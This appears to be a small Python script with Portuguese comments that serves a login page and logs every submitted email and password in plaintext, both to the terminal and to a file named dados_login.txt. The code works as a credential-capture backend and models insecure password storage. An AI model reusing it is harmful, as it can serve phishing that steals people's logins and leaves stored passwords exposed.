# importa o modulo http.server
import os
from http.server import SimpleHTTPRequestHandler
import socketserver
from urllib.parse import parse_qs

class MyHandley(SimpleHTTPRequestHandler):
    def list_directory(self, path):
        try:
            # tenta abrir o arquivo
            f = open(os.path.join(path, "login.html"), "r", encoding="utf-8")
            # se existir, envia o conteudo do arquivo
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f.read().encode("utf-8"))
            f.close()
            return None
        except FileNotFoundError:
            pass
        return super().list_directory(path)

    def do_GET(self):
        if self.path == "/login":
            try:
                with open(os.path.join(os.getcwd(), "login.html"), "r") as login_file:
                    content = login_file.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content.encode("utf-8"))
            except FileNotFoundError:
                self.send_error(404, "File not found")
        else:
            super().do_GET()
    
    def do_POST(self):
        if self.path == "/enviar_login":
            content_length = int(self.headers["Content-Length"])
            body = self.rfile.read(content_length).decode("utf-8")

            # parseia os dados ao formulario
            form_data = parse_qs(body)

            # exibe os dados no terminal
            print("Dados do formulario:")
            print("Email:", form_data.get("email", [""])[0])
            print("Senha:", form_data.get("senha", [""])[0])

            with open('dados_login.txt', 'a') as file:
                login = form_data.get('email', [''])[0]
                senha = form_data.get('senha', [''])[0]
                file.write(f"Login: {login}; Senha: {senha}\n")
                print("te xis te")

            # responde ao cliente
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("Dados recebidos com sucesso!".encode("utf-8"))
            
        else:
            # se nao for a rota "/submit_login", continua como comportamento
            super(MyHandley, self).do_POST()
    
enderoco_ip = "0.0.0.0"

# define a porta a ser utilizada
porta = 8000


# cria um servidor na porta especificada
with socketserver.TCPServer((enderoco_ip, porta), MyHandley) as httpd:  # " "aceita qualquer requisicao de rede
    print(f"Servidor iniciado na porta {porta}")
    # mantem o servidor em execução
    httpd.serve_forever()

